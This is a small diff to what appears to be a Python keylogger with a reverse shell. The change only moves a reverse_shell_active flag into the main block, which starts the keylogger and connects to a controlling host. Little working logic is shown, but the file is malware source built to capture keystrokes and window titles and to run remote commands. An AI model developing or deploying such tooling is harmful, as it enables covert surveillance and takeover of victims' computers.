@@ -18,7 +18,6 @@ from win32gui import GetWindowText, GetForegroundWindow
 
 #logging.basicConfig(level=logging.DEBUG) # Show Console Output
 logging.basicConfig(level=logging.WARN) # Dont show Console Output
-reverse_shell_active = False
 
 class Keylogger:
     def __init__(self, log_interval, window_interval, reconnect_interval):
@@ -252,6 +251,7 @@ def execute_command(command:str) -> str:
 
 #--------------- MAIN ---------------#
 if __name__ == "__main__":
+    reverse_shell_active = False
     keylogger = Keylogger(log_interval=15, window_interval=0.25, reconnect_interval=5)
     keylogger.start()
     keylogger.connect_to_host()
